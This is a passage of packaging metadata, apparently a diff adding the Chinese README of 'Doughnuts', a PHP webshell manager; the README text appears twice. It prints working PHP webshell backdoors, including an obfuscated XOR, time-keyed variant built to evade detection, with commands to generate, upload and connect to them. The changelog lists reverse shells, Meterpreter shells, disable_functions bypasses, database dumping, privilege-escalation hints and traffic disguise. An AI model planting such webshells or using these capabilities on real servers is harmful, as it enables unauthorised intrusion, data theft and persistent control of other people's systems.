需要额外参数与解码的webshell:\n\n        ```php\n        //test3.php\n        <?php\n        if(@md5($_POST[\'a\']) == "202cb962ac59075b964b07152d234b70"){  // a=123\n        \t@eval(base64_decode($_POST[\'2333\']));\n        }\n        ```\n\n        那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:\n\n        ```\n        connect http://localhost/test.php POST 2333 base64 "data:a=123"\n        ```\n\n2. 生成webshell:\n\n    1. 在执行`python3 -m doughnuts.install`之后执行`doughnuts generate a.php POST pass salt 1`在当前目录下生成Pudding类型的webshell:a.php\n    2. 上传a.php,根据提示执行 `doughnuts connect {木马url} POST pass doughnuts-salt `连接至webshell\n\n## 自定义编码器\n1. 进入doughnuts/encode目录\n2. 新建/拷贝一个py文件,起一个名字,以time.py为例\n3. 文件中只需要写一个run函数,类似于\n```python\nfrom libs.config import alias\n\n\n@alias(True)\ndef run(data: str):\n    cipher = data\n    return cipher\n```\n4. 参数解释: data是传输的数据,为字符串,cipher为传出的数据,也应该为字符串\n5. 重启doughnuts即可使用`se/show_encoders`命令查看自定义的编码器,连接时使用`connect URL 请求方法 密码 编码器名字`即可使用自定义编码器\n6. 一个例子,以时间为秘钥的编码器\n```python\nfrom libs.config import alias\nfrom hashlib import md5\nfrom base64 import b64encode\nimport time\n\n\n@alias(True)\ndef run(data: str):\n    format_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())\n    key = md5(format_time.encode()).hexdigest().encode()\n    data = data.encode()\n    cipher = bytes(data[i] ^ key[i % 32] for i in range(len(data)))\n    cipher = b64encode(cipher).decode()\n\n    return cipher\n```\n对应的php webshell\n```php\n<?php \nclass COMI { \n    public $c=\'\';\n    function __destruct() {\n        return eval(substr($this->c, 0));\n    }\n}\ndate_default_timezone_set("PRC");\n$comi = new COMI();\n$password = &$password1;\n$password1 = $_REQUEST[\'x\'];\n$post = &$password;\n$post=base64_decode($post);\n$key=md5(date("Y-m-d H:i",time()));\nfor($i=0;$i<strlen($post);$i++){\n    $post[$i] = $post[$i] ^ $key[$i%32];\n}\n$lnng1 = &$lnng;\n$lnng = $post;\n$lnng2 = $lnng1;\n@$comi->c = substr($lnng2, 0);\n?>\n```\n\n## 自定义webshell模板\n1. 进入doughnuts/webshell_plugins目录\n2. 新建/拷贝一个py文件,起一个名字,以test.py为例\n3. 文件中只需要写一个get_php函数,类似于\n```python\ndef get_php(keyword: int = 4, passwd: str = "", salt: str = ""):\n    ...\n```\n4. 各个参数解释\n    - keyword是一个数字对应一种请求方式,分别对应: GET->3 POST->4 COOKIE->5 HEADER->6\n    - passwd是连接webshell的密码\n    - salt是用于加密算法的盐,你可以不需要使用这个参数,但是函数定义里必须存在\n5. 重启doughnuts或者在doughnuts使用`reload generate`重新加载generate命令,即可使用doughnuts生成自定义webshell\n\n## 参考\n\n- https://github.com/WangYihang/Webshell-Sniper\n- https://github.com/epinna/weevely3\n\n## 更新日志\n\n### 4.9\n- 4.9.0\n    - 修改核心\n        - 添加custom_plugins目录,用于存放用户自己编写的插件\n        - 添加config.ini文件,用于配置相关参数\n- 4.9.1\n    - 修复在pypi版本与github版本不一致的问题\n- 4.9.2\n- 4.9.3\n    - 修复在不存在自定义命令时连接webshell后帮助菜单无法显示的bug\n\n### 4.8\n- 4.8.0\n    - 修改命令\n        - generate命令 现在支持在自定义webshell模板,在doughnuts/webshell_plugins下可以添加自己的模板,详情请查看上面的自定义webshell模板\n- 4.8.1\n    - 优化代码结构\n    - 优化doughnuts加密算法\n    - 修复enrecv不存在的问题\n\n### 4.7\n- 4.7.0\n    - 修改命令\n        - remp命令 修改php模式的payload,添加bash和python的payload\n        - bdf命令 php-fpm模式(https://xz.aliyun.com/t/5598)\n\n### 4.6\n- 4.6.0\n    - 添加命令\n        - verbose命令 用于开启/关闭提示符的详细信息显示\n\n### 4.5\n- 添加命令\n    - enrecv命令 用于随时开启/关闭回显加密\n    - remp命令 可以简易的弹一个meterpreter的shell\n- 修复bug\n    - 修复回显加密在弹shell时可能会出现解码错误的问题\n- 4.5.1\n    - 现在使用随机字符作为连接是否成功的判断以防特征检测\n- 4.5.2\n    - 添加命令\n        - mkdir命令 创建文件夹\n        - rmdir命令 删除空文件夹\n\n### 4.4\n- 修改核心\n    - 使用算法将回显加密\n- 4.4.1\n    - 修复bug\n        - **回显加密在php5会出错**\n- 4.4.2\n    - 修改命令\n        - touch命令 提示修改\n        - ps命令    提示修改,只允许在*unix目标上运行\n    - 修复bug\n        - 曾导致在linux下调用vi编辑器失败\n\n### 4.3\n- 修改命令\n    - portscan去除短名ps, 修改显示结果,变得更加可读\n    - bobd支持在ini_set被禁用时使用ini_alter\n    - bdf php7-backtrace 添加在Exception类被禁用后使用Error类\n- 添加命令\n    - copy命令 用于复制文件\n    - ps命令 类似于linux下的ps命令,用于读取系统进程信息\n- 修复bug\n    - 在back返回主菜单后清理mysql连接记录\n\n\n### 4.2\n- 修改结构\n    - myapp尝试丢弃webshell执行代码之前的输出\n- 添加命令\n    - mdownload命令 用于分块下载文件\n- 修改命令\n    - mupload命令 完全重写,真正意义上的分块上传,修复mupload上传失败不会自动清理临时文件的问题\n- 修复bug\n    - 修复mdownload, mupload没有ls后补全的问题\n- 新增依赖\n    - tqdm\n- 4.2.1\n    - 修改命令\n        - db_mdump命令 优化,去除key键,去除表结构中的Not NULL, 使用mysql_real_escape_string转义\n\n\n\n\n### 4.1\n- 修改结构\n    - 新建插件时不再需要更改helpmenu.py\n\n\n### 4.0\n- 修改命令\n    - 修复当使用mysqli扩展链接mysql数据库时db_info显示的问题\n    - 修复当使用pdo扩展链接数据库时无法db_dump的问题\n    - 修复某些文本错误\n    - db_dump命令 \n        - 不再目标主机上写入文件而是直接下载到本地,修改参数{web_file_path}->{local_path}\n        - 添加参数 {table} 用于指定数据表,默认存储文件名为{database}.{table}.sql\n    - dump命令\n        - 修复一个bug曾导致路径拼接时使用\\转义了外部php的引号导致的报错\n- 添加命令\n    - db_mdump命令 用于分块dump数据库\n- 4.0.1\n    - 修复了db_mdump导出的数据库encoding错误导致sql文件无法导入的问题\n- 4.0.2\n    - 修复了db_mdump数据重复的问题\n- 4.0.3\n    - 删除测试输出,删除db_mdump中DROP DATABASE语句\n\n\n### 3.10\n- 修改命令\n    - bdf命令 php7-plDoublyLinkedList模式(Origin:https://www.freebuf.com/vuls/251017.html)\n- 增加命令\n    - mupload命令 用于分块压缩上传文件\n- 3.10.3\n    - mupload添加多线程,hash校验\n    - 修复了引号不闭合时线程阻塞的错误\n\n### 3.9\n\n- 增加对pcntl_exec执行系统命令的支持(Only for *unix)\n- 3.9.2\n    - 修改reverse命令以bash方式反弹shell存在的问题\n    - 删除测试语句\n    - 修改checkvm命令的显示问题\n    - 添加对ctrl+l的支持\n    - 修复在外部调用generate报错的问题\n- 3.9.3\n    - 修复在某些情况下windows无法使用方向键的问题\n    - 修复dump命令无法打包的问题\n    - 修复gululinbo shell无法使用数字作为密码的问题\n\n### 3.8\n\n- 修改banner\n- 修改命令\n    - bdf命令 添加MYSQL-UDF模式,要求目标数据库是mysql且大于等于5.1,并使用db_init连接至目标数据库(该模式仍处于实验之中)\n    - db_shell命令 曾导致在查询的内容多行返回的时候报错\n\n\n\n### 3.7\n\n- 修改命令\n\n    - ls命令 曾导致在某些情况下无法获取文件的权限\n    - db_shell命令 曾导致在查询的内容多行返回的时候报错\n    - db_dump命令 没有预设pdo的dump,导致完全无法使用\n    - priv命令 使用php命令编写,不再需要运行系统命令\n    - shell webshell命令 曾导致无法进入伪交互界面\n    - reverse命令 \n        - linux下使用php反弹, 假如proc_open被禁用,不再反弹假shell,而是尝试执行系统命令使用php -n -r反弹shell\n        - 修复一个bug曾导致linux下使用python反弹失败\n        - 修复一个bug曾导致bash反弹失败\n    - rs命令 在proc_open被禁用的情况下会尝试执行系统命令使用php -n -r反弹shell\n    - generate命令 曾导致在外部使用时无法生成\n\n\n\n### 3.6\n\n- **修复一个严重的解析错误!!!**\n- 由于种种解析上的意外,将解析回退为稳定版本\n\n### 3.5\n\n- 修改命令\n    - checkvm命令现在归属于DETECT分类\n    - connect命令 在没有webshell.log或webshell.log没有内容时会存在连接失败的问题\n- 新增命令\n    - av命令 (仅限于windows)检测在目标系统中运行的杀毒软件\n- 3.5.1\n    - 修改文件说明\n    - 修改版本提示\n    - 更新avlist\n    - 修改checkvm的代码逻辑\n- 3.5.2\n    - 更改priv命令的bug曾导致离线抓取的内容并不准确\n- 3.5.3(作废)\n    - 修复了在python3.6的情况下某些错误导致参数解析出现问题\n\n\n### 3.4\n- 修改命令\n   - ls命令现在可以进行二阶补全,并且可以尝试根据UID和GID获取对应用户名称(仅*unix)\n   \n   - exexute命令增加显示状态码和响应长度\n   \n   - reverse|re命令 \n   \n       - 添加bash、powershell(base64编码)、perl的反弹方式\n       - 修改python的反弹模式，直接执行命令而不再上传文件（base64编码）\n   \n       - 修改windows下php的反弹模式：写入一个exe文件进行反弹，并在10秒删除（可能在某些系统下无法成功反弹）\n       - reshell|rs命令 删除了mode2->script\n- 新增命令\n   - reaload命令(通用) 开发者命令，在不退出程序的情况下重新加载插件。\n   - set命令(通用) 设置变量，然后再以后的语句中使用#{varname}来使用它。\n   - get命令(通用) 获取已设置的变量。\n   - save命令(通用) 将已设置好的变量存储于该工具目录下的variables.config文件中，并且每次使用该工具时都会自动读取工具目录下variables.config文件中管道变量配置。\n   - checkvm命令(webshell) 简单的检查目标机器是否是虚拟机。\n   - priv命令(webshell) 寻找拥有suid,属于root的文件,并根据结果显示提权帮助(仅限于*unix)\n- 修复错误\n   - 在非debug-dev模式下调用ic不会再引发错误\n   - 在某些情况下连接成功无法写入记录\n\n\n\n### 3.3\n- 请求时添加随机Referer与UA进行伪装\n- 新增依赖 pysocks\n- 新增命令\n    - proxy命令(通用)  设置连接代理,支持socks,http代理\n    - fl命令(通用) 类似于fc命令，寻找access.log与error.log日志\n- 修改命令\n    - db系列命令 现在支持使用PDO扩展来连接其他数据库\n    - db_init 添加参数，支持使用PDO连接其他数据库。参数db_init {host} {username} {password} {dbname=\'\'} {port=0} {dbms=\'mysql\'}\n    - touch命令 增加创建空文件的功能（不限目标系统）\n- 修复bug\n    - 在某些情况下调用外带编辑器失败\n    - ls后输入相关命令无法补全文件夹名\n- 修改文本\n\n\n### V3.2\n- 新增命令\n    - lsh|!命令(通用) 在当前机器中运行命令,可用于切换工作目录\n    - debug命令(通用但不在帮助菜单中显示) debug SEND/LOOP 开启/关闭SEND/LOOP的调试()调试专用\n    - **generate|gen命令 (初始界面) 生成php木马,使用自制的编码方式进行编码**\n        - generate的调用方式:\n        - 直接在交互式界面外调用:\n            - 在执行`python3 -m doughnuts.install`后:`doughnuts generate a.php POST 123 1`\n            - `python3 doughnuts.py generate a.php POST 123`\n        - 在交互式界面调用:\n            - `doughnutsgenerate a.php POST 123`\n- 修改命令\n    - search命令 现在search命令的调用方式为: `search {pattern} {web_file_path}`,支持正则表达式\n    - c|connect 命令 (初始界面) 现在支持额外参数,并且可以在交互式界面外调用,如:\n        - 在执行`python3 -m doughnuts.install`后:`doughnuts connect http://127.0.0.1/eval.php POST asd data:a=123` \n    - ls|dir 命令 现在支持模式选择：scandir(1)/glob(2)\n    - write、edit、execute支持调用自定义的编辑器\n- 修改项目结构\n- 修改文本错误\n- 修复bug\n\n\n### V3.1\n- 新增命令\n    - rm命令(初始界面) 删除指定webshell记录\n    - log命令(通用) (只支持*unix)将输入与输出记录到日志中\n\n\n### V3.0\n- 重新修改了bdf的顺序,添加了新模式\n    - -1:close\n    - auto: 自动识别\n    - 0(默认):查看bdf当前状态\n    - 1:php7-backtrace\n    - 2:php7-gc\n    - 3:php7-json\n    - 4:LD_PRELOAD\n    - 5:FFI\n    - 6:COM\n    - 7:imap_open\n- 修改命令参数解析,使用shlex库进行解析\n- 修复了一些在终端输入的bug\n- 使用LD_PRELOAD来绕过disable_functions,在退出后会尝试自动清理\n\n\n### V2.9\n- 修改了bdf模式顺序,原模式2-3顺移为3-4,新增bdf命令模式\n    - mode2 php7-json\n        - 利用php-json反序列化绕过disable_functions\n    - mode5 COM\n        - 利用windows组件绕过disable_functions\n\n\n\n### V2.8\n- 修复一堆bug\n- 新增bdf命令模式\n    - mode2 LD_PRELOAD\n        - 利用ld_preload绕过disable_functions,需要上传编译好的.so文件,若自带的.so文件不起效,请在auxiliary找到ld_preload.c自行在于目标近似的环境下编译并覆盖原文件\n    - mode3 FFI\n        - 利用FFI扩展绕过disable_functions,需要PHP7.4及以上\n\n\n### V2.7\n- 一些细微的调整\n- 修改核心逻辑\n- 添加命令\n    - bdf 尝试绕过disable_functions.目前只支持php7-backtrace这个模式\n    - bobd 尝试利用ini_set与chdir绕过open_basedir.\n\n\n### V2.6\n- 修复bug\n- 修改命令\n    - shell 可以非交互运行一句系统命令\n    - webshell 可以非交互运行一句webshell代码\n- 添加命令\n    - execute 调用notepad/vi运行一段自定义的php代码\n    - getenv 获取php环境变量\n\n\n### V2.5\n- 新增依赖 prettytable\n- 添加一系列数据库管理命令\n    - db_init 初始化数据库连接\n    - db_info 输出数据库信息\n    - db_use 修改当前所在数据库\n    - db_dbs 输出所有数据库信息\n    - db_tables 输出某个数据库的所有表信息\n    - db_columns 输出某个表的所有字段信息\n    - db_shell 获得一个临时的sql shell\n\n\n### V2.4\n- 继续优化输入,现在支持历史命令补全,命令补全以及执行ls之后的文件(夹)名补全\n\n\n### V2.3\n- 尝试绕过disable_functions寻找可执行的系统命令函数\n- 请求错误处理\n- read命令更名为cat命令,别名为c\n- 添加move(mv),chmod命令\n\n\n### V2.2\n- 重写输入，现在支持按下ctrl+c与ctrl+d\n- 添加clear命令\n\n\n### V2.1\n- 修改windows环境下python反弹shell上传位置,并使其可以返回错误\n- 修改帮助菜单为等宽\n- 添加socks命令,用于在目标主机中开启socks5服务器\n\n\n### V2.0\n\n- 修复一个BUG曾导致无法连接php7的webshell\n- 修复一个BUG曾导致help无法输出对应的帮助\n- 修改help命令的别名为?,现在只输入?或help将输出帮助菜单\n- 修改info输出的信息\n- 修改各个函数的帮助信息,变得更加统一\n- 重写fc与fwpf命令,重写树状输出\n- 新增ls,bindshell(only for *unix)命令\n\n### V1.9\n- 添加search命令,使用glob函数递归搜索文件.命令格式为search {pattern}\n\n### V1.8\n- 优化连接时发送的请求,从发送三次变成发送2次\n- 修改pdf命令的逻辑,在连接时获取\n- 优化reshell命令,命令格式为reshell {lhost} {port} {type=[python|script|upload]{1|2|3},default = 0 (Python:1 Not Python:3)} {(Only for Mode 2) fakename=/usr/lib/systemd} 三种模式分别为:1->使用python pty模块升级, 2->使用linux自带的script命令升级, 3->上传一个反弹pty的二进制文件并运行(可以伪造进程名,若无法反弹请进入libs目录拿取源码,使用目标相同发行版进行编译后覆盖原reverse_server_light文件)\n\n\n### V1.7\n\n- 修改reshell命令,修复bug,优化体验,可以随意伪装进程名\n- 在libs目录下放置reverse_server_light的源码,方便编译与修改(origin:https://github.com/QAX-A-Team/ptyshell)\n- 重写portscan,支持三种扫描方式\n\n\n### V1.6\n\n- 修复了若干bug\n- 添加了reshell命令,监听本地端口,并让目标反弹一个完整交互式的shell(仅限双方系统都是linux且可能存在一定的问题)\n\n\n### V1.5\n\n- modify指令现在会调用notepad/vim进行编辑\n- write指令现在会调用notepad/vim进行编辑\n- dump命令现在使用原始php代码进行压缩,可以压缩子目录\n- 优化了发送payload的间隔符\n\n### V1.4\n\n- 添加指令:修改文件\n- 关闭debug模式\n- 修复了某些情况下fwpf,fc指令无法使用的情况,现在发送数据时会关闭错误提示\n\n\n## 免责声明\n\n本项目仅供网站管理人员与渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关.\n\n',
+    'long_description': '# Doughnuts\n\n*一个基于Python3.6+的PHPwebshell管理器*\n\n![main1.png](https://i.loli.net/2020/11/15/QhsPHi7DojbMXcu.png)\n\n![info1.png](https://i.loli.net/2020/11/15/rjAd6hO4fQEWXbi.png)\n\n![part1.png](https://i.loli.net/2020/11/15/weaESdmyCxGV3Jr.png)\n\n![part2.png](https://i.loli.net/2020/11/15/pKlViB9qQvjh82F.png)\n\n![part3.png](https://i.loli.net/2020/11/15/P4T3GfyFXcNbkwQ.png)\n\n![part4.png](https://i.loli.net/2020/11/15/HZu3jdNXB4SoWxU.png)\n\n## 使用文档\n\n***终于迎来了新的使用文档！***\n\n详细使用文档请前往[此页面](http://doughnuts.cc/)进行查看。\n\n## 特征\n\n- 支持连接,记录,管理webshell,方便下一次连接\n- 基于eval的连接,支持GET,POST,COOKIE,HEADER四种连接方式\n- **请求与响应伪装**\n- 支持编码payload(已内置base64,str_rot13,hex,doughnuts四种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell\n- 支持绕过open_basedir\n- 支持多种方式绕过disable_functions\n    - 自动识别\n    - php7-backtrace\n    - php7-gc\n    - php7-json\n    - php7-plDoublyLinkedList\n    - LD_PRELOAD\n    - FFI\n    - COM\n    - imap_open\n- 核心功能\n    - 获取网站,系统,进程信息\n    - 输出disbale_functions\n    - 寻找可写的PHP文件(以树状结构显示)\n    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)\n    - 执行自定义的php代码\n    - 获取一个临时的非完全交互式shell和webshell\n    - 正向/反弹shell\n    - (仅限双方均为*unix)获取完全交互式的反弹shell\n    - 读/写/上传/下载/删除/搜索文件,目录打包\n    - 数据库管理,脱库\n    - 端口扫描\n    - 内网网页文本式浏览代理，可自定义请求方法和数据\n    - 开启socks5服务器\n    - 检测suid文件并给出提权建议 / 检测杀毒软件\n    - 可以支持简易弹meterpreter的shell\n- 易于扩展\n\n## 依赖\n\n- Python3.6+\n- Python-requests\n- Python-pysocks\n- Python-colorama\n- Python-prettytable\n\n## 安装/运行方法\n\n***请在3.2版本之前运行过`python3 -m doughnuts.install`安装的朋友在更新3.2版本之后重新执行此命令!***\n\n- 使用pip安装\n\n```sh\n# 安装\npython3 -m pip install doughnuts --user -i https://pypi.org/simple/\n# (windows)添加一个bat文件到python根目录下\n# (*unix)添加一个可执行文件到/usr/local/bin下\n# 安装启动器,以方便调用\npython3 -m doughnuts.install\n# 运行\ndoughnuts\n# 或\npython3 -m doughnuts\n# enjoy it!\n```\n\n- 通过poetry安装\n\n```sh\npyton3 -m pip install poetry # 或其他方法安装python-poetry\ngit clone https://github.com/WAY29/Doughnuts.git\ncd Doughnuts\n# debian/ubuntu系统需要运行此命令\napt-get install python3-venv\n# 安装\npoetry install\n# 运行\npoetry run python3 Doughnuts/doughnuts.py # 应该对所有系统生效\n# enjoy it!\n```\n\n- 直接安装\n\n```sh\n# 安装PYTHON 3.6+\ngit clone https://github.com/WAY29/Doughnuts.git\ncd Doughnuts/doughnuts\npip3 install -r requirements.txt 或 pip3 install requests pysocks colorma prettytable tqdm\n# (windows)添加一个bat文件到python根目录下\n# (*unix)添加一个可执行文件到/usr/local/bin下\n# 安装启动器,以方便调用\npython3 install.py\n# 运行\ndoughnuts\n# 或\npython3 doughnuts.py\n# enjoy it!\n```\n\n## 使用例子\n\n*由于windows原因，在windows命令行连接下不支持&符号连接参数。\n尽量将额外参数包裹引号进行传递，且逐一拆分。\n好的习惯:"data:a=123" "data:b=456"\n坏的习惯:"data:a=123&b=456" (在windows命令行下会连接失败)*\n\n1. 普通webshell:\n\n    - 最平凡的webshell:\n\n        ```php\n        //test1.php\n        <?php\n        error_reporting(0);\n        eval($_POST[\'2333\']);\n        ?>\n      ```\n      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:\n      ```\n      connect http://localhost/test1.php POST 2333\n      ```\n      \n    - 带解码的webshell:\n\n        ```php\n        //test2.php\n        <?php\n        error_reporting(0);\n        eval(str_rot13(base64_decode($_REQUEST[\'2333\'])));\n        ?>\n      ```\n    那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:\n      \n      ```\n      connect http://localhost/test2.php POST 2333 rot13 base64\n      ```\n      \n    - 需要额外参数与解码的webshell:\n\n        ```php\n        //test3.php\n        <?php\n        if(@md5($_POST[\'a\']) == "202cb962ac59075b964b07152d234b70"){  // a=123\n        \t@eval(base64_decode($_POST[\'2333\']));\n        }\n        ```\n\n        那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:\n\n        ```\n        connect http://localhost/test.php POST 2333 base64 "data:a=123"\n        ```\n\n2. 生成webshell:\n\n    1. 在执行`python3 -m doughnuts.install`之后执行`doughnuts generate a.php POST pass salt 1`在当前目录下生成Pudding类型的webshell:a.php\n    2. 上传a.php,根据提示执行 `doughnuts connect {木马url} POST pass doughnuts-salt `连接至webshell\n\n## 自定义编码器\n1. 进入doughnuts/encode目录\n2. 新建/拷贝一个py文件,起一个名字,以time.py为例\n3. 文件中只需要写一个run函数,类似于\n```python\nfrom libs.config import alias\n\n\n@alias(True)\ndef run(data: str):\n    cipher = data\n    return cipher\n```\n4. 参数解释: data是传输的数据,为字符串,cipher为传出的数据,也应该为字符串\n5. 重启doughnuts即可使用`se/show_encoders`命令查看自定义的编码器,连接时使用`connect URL 请求方法 密码 编码器名字`即可使用自定义编码器\n6. 一个例子,以时间为秘钥的编码器\n```python\nfrom libs.config import alias\nfrom hashlib import md5\nfrom base64 import b64encode\nimport time\n\n\n@alias(True)\ndef run(data: str):\n    format_time = time.strftime("%Y-%m-%d %H:%M", time.localtime())\n    key = md5(format_time.encode()).hexdigest().encode()\n    data = data.encode()\n    cipher = bytes(data[i] ^ key[i % 32] for i in range(len(data)))\n    cipher = b64encode(cipher).decode()\n\n    return cipher\n```\n对应的php webshell\n```php\n<?php \nclass COMI { \n    public $c=\'\';\n    function __destruct() {\n        return eval(substr($this->c, 0));\n    }\n}\ndate_default_timezone_set("PRC");\n$comi = new COMI();\n$password = &$password1;\n$password1 = $_REQUEST[\'x\'];\n$post = &$password;\n$post=base64_decode($post);\n$key=md5(date("Y-m-d H:i",time()));\nfor($i=0;$i<strlen($post);$i++){\n    $post[$i] = $post[$i] ^ $key[$i%32];\n}\n$lnng1 = &$lnng;\n$lnng = $post;\n$lnng2 = $lnng1;\n@$comi->c = substr($lnng2, 0);\n?>\n```\n\n## 自定义webshell模板\n1. 进入doughnuts/webshell_plugins目录\n2. 新建/拷贝一个py文件,起一个名字,以test.py为例\n3. 文件中只需要写一个get_php函数,类似于\n```python\ndef get_php(keyword: int = 4, passwd: str = "", salt: str = ""):\n    ...\n```\n4. 各个参数解释\n    - keyword是一个数字对应一种请求方式,分别对应: GET->3 POST->4 COOKIE->5 HEADER->6\n    - passwd是连接webshell的密码\n    - salt是用于加密算法的盐,你可以不需要使用这个参数,但是函数定义里必须存在\n5. 重启doughnuts或者在doughnuts使用`reload generate`重新加载generate命令,即可使用doughnuts生成自定义webshell\n\n## 参考\n\n- https://github.com/WangYihang/Webshell-Sniper\n- https://github.com/epinna/weevely3\n\n## 更新日志\n\n### 4.9\n- 4.9.0\n    - 修改核心\n        - 添加custom_plugins目录,用于存放用户自己编写的插件\n        - 添加config.ini文件,用于配置相关参数\n- 4.9.1\n    - 修复在pypi版本与github版本不一致的问题\n- 4.9.2\n- 4.9.3, 4.9.4\n    - 修复在不存在自定义命令时连接webshell后帮助菜单无法显示的bug\n\n### 4.8\n- 4.8.0\n    - 修改命令\n        - generate命令 现在支持在自定义webshell模板,在doughnuts/webshell_plugins下可以添加自己的模板,详情请查看上面的自定义webshell模板\n- 4.8.1\n    - 优化代码结构\n    - 优化doughnuts加密算法\n    - 修复enrecv不存在的问题\n\n### 4.7\n- 4.7.0\n    - 修改命令\n        - remp命令 修改php模式的payload,添加bash和python的payload\n        - bdf命令 php-fpm模式(https://xz.aliyun.com/t/5598)\n\n### 4.6\n- 4.6.0\n    - 添加命令\n        - verbose命令 用于开启/关闭提示符的详细信息显示\n\n### 4.5\n- 添加命令\n    - enrecv命令 用于随时开启/关闭回显加密\n    - remp命令 可以简易的弹一个meterpreter的shell\n- 修复bug\n    - 修复回显加密在弹shell时可能会出现解码错误的问题\n- 4.5.1\n    - 现在使用随机字符作为连接是否成功的判断以防特征检测\n- 4.5.2\n    - 添加命令\n        - mkdir命令 创建文件夹\n        - rmdir命令 删除空文件夹\n\n### 4.4\n- 修改核心\n    - 使用算法将回显加密\n- 4.4.1\n    - 修复bug\n        - **回显加密在php5会出错**\n- 4.4.2\n    - 修改命令\n        - touch命令 提示修改\n        - ps命令    提示修改,只允许在*unix目标上运行\n    - 修复bug\n        - 曾导致在linux下调用vi编辑器失败\n\n### 4.3\n- 修改命令\n    - portscan去除短名ps, 修改显示结果,变得更加可读\n    - bobd支持在ini_set被禁用时使用ini_alter\n    - bdf php7-backtrace 添加在Exception类被禁用后使用Error类\n- 添加命令\n    - copy命令 用于复制文件\n    - ps命令 类似于linux下的ps命令,用于读取系统进程信息\n- 修复bug\n    - 在back返回主菜单后清理mysql连接记录\n\n\n### 4.2\n- 修改结构\n    - myapp尝试丢弃webshell执行代码之前的输出\n- 添加命令\n    - mdownload命令 用于分块下载文件\n- 修改命令\n    - mupload命令 完全重写,真正意义上的分块上传,修复mupload上传失败不会自动清理临时文件的问题\n- 修复bug\n    - 修复mdownload, mupload没有ls后补全的问题\n- 新增依赖\n    - tqdm\n- 4.2.1\n    - 修改命令\n        - db_mdump命令 优化,去除key键,去除表结构中的Not NULL, 使用mysql_real_escape_string转义\n\n\n\n\n### 4.1\n- 修改结构\n    - 新建插件时不再需要更改helpmenu.py\n\n\n### 4.0\n- 修改命令\n    - 修复当使用mysqli扩展链接mysql数据库时db_info显示的问题\n    - 修复当使用pdo扩展链接数据库时无法db_dump的问题\n    - 修复某些文本错误\n    - db_dump命令 \n        - 不再目标主机上写入文件而是直接下载到本地,修改参数{web_file_path}->{local_path}\n        - 添加参数 {table} 用于指定数据表,默认存储文件名为{database}.{table}.sql\n    - dump命令\n        - 修复一个bug曾导致路径拼接时使用\\转义了外部php的引号导致的报错\n- 添加命令\n    - db_mdump命令 用于分块dump数据库\n- 4.0.1\n    - 修复了db_mdump导出的数据库encoding错误导致sql文件无法导入的问题\n- 4.0.2\n    - 修复了db_mdump数据重复的问题\n- 4.0.3\n    - 删除测试输出,删除db_mdump中DROP DATABASE语句\n\n\n### 3.10\n- 修改命令\n    - bdf命令 php7-plDoublyLinkedList模式(Origin:https://www.freebuf.com/vuls/251017.html)\n- 增加命令\n    - mupload命令 用于分块压缩上传文件\n- 3.10.3\n    - mupload添加多线程,hash校验\n    - 修复了引号不闭合时线程阻塞的错误\n\n### 3.9\n\n- 增加对pcntl_exec执行系统命令的支持(Only for *unix)\n- 3.9.2\n    - 修改reverse命令以bash方式反弹shell存在的问题\n    - 删除测试语句\n    - 修改checkvm命令的显示问题\n    - 添加对ctrl+l的支持\n    - 修复在外部调用generate报错的问题\n- 3.9.3\n    - 修复在某些情况下windows无法使用方向键的问题\n    - 修复dump命令无法打包的问题\n    - 修复gululinbo shell无法使用数字作为密码的问题\n\n### 3.8\n\n- 修改banner\n- 修改命令\n    - bdf命令 添加MYSQL-UDF模式,要求目标数据库是mysql且大于等于5.1,并使用db_init连接至目标数据库(该模式仍处于实验之中)\n    - db_shell命令 曾导致在查询的内容多行返回的时候报错\n\n\n\n### 3.7\n\n- 修改命令\n\n    - ls命令 曾导致在某些情况下无法获取文件的权限\n    - db_shell命令 曾导致在查询的内容多行返回的时候报错\n    - db_dump命令 没有预设pdo的dump,导致完全无法使用\n    - priv命令 使用php命令编写,不再需要运行系统命令\n    - shell webshell命令 曾导致无法进入伪交互界面\n    - reverse命令 \n        - linux下使用php反弹, 假如proc_open被禁用,不再反弹假shell,而是尝试执行系统命令使用php -n -r反弹shell\n        - 修复一个bug曾导致linux下使用python反弹失败\n        - 修复一个bug曾导致bash反弹失败\n    - rs命令 在proc_open被禁用的情况下会尝试执行系统命令使用php -n -r反弹shell\n    - generate命令 曾导致在外部使用时无法生成\n\n\n\n### 3.6\n\n- **修复一个严重的解析错误!!!**\n- 由于种种解析上的意外,将解析回退为稳定版本\n\n### 3.5\n\n- 修改命令\n    - checkvm命令现在归属于DETECT分类\n    - connect命令 在没有webshell.log或webshell.log没有内容时会存在连接失败的问题\n- 新增命令\n    - av命令 (仅限于windows)检测在目标系统中运行的杀毒软件\n- 3.5.1\n    - 修改文件说明\n    - 修改版本提示\n    - 更新avlist\n    - 修改checkvm的代码逻辑\n- 3.5.2\n    - 更改priv命令的bug曾导致离线抓取的内容并不准确\n- 3.5.3(作废)\n    - 修复了在python3.6的情况下某些错误导致参数解析出现问题\n\n\n### 3.4\n- 修改命令\n   - ls命令现在可以进行二阶补全,并且可以尝试根据UID和GID获取对应用户名称(仅*unix)\n   \n   - exexute命令增加显示状态码和响应长度\n   \n   - reverse|re命令 \n   \n       - 添加bash、powershell(base64编码)、perl的反弹方式\n       - 修改python的反弹模式，直接执行命令而不再上传文件（base64编码）\n   \n       - 修改windows下php的反弹模式：写入一个exe文件进行反弹，并在10秒删除（可能在某些系统下无法成功反弹）\n       - reshell|rs命令 删除了mode2->script\n- 新增命令\n   - reaload命令(通用) 开发者命令，在不退出程序的情况下重新加载插件。\n   - set命令(通用) 设置变量，然后再以后的语句中使用#{varname}来使用它。\n   - get命令(通用) 获取已设置的变量。\n   - save命令(通用) 将已设置好的变量存储于该工具目录下的variables.config文件中，并且每次使用该工具时都会自动读取工具目录下variables.config文件中管道变量配置。\n   - checkvm命令(webshell) 简单的检查目标机器是否是虚拟机。\n   - priv命令(webshell) 寻找拥有suid,属于root的文件,并根据结果显示提权帮助(仅限于*unix)\n- 修复错误\n   - 在非debug-dev模式下调用ic不会再引发错误\n   - 在某些情况下连接成功无法写入记录\n\n\n\n### 3.3\n- 请求时添加随机Referer与UA进行伪装\n- 新增依赖 